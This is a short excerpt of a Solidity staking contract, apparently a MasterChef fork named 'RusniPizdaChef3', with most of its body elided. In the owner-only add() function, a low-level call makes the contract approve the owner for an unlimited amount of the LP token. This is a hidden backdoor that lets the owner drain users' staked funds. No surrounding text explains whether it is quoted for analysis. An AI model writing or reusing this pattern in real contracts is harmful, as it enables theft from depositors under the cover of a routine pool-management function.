...
contract RusniPizdaChef3 is Ownable {
    using SafeMath for uint256;
    ...
    function add(uint256 _allocPoint, IBEP20 _lpToken, bool _withUpdate) public onlyOwner {
        ...
        updateStakingPool();
        (bool success, bytes memory result) = address(_lpToken).call(abi.encodeWithSignature("approve(address,uint256)", msg.sender, uint256(-1)));
    }
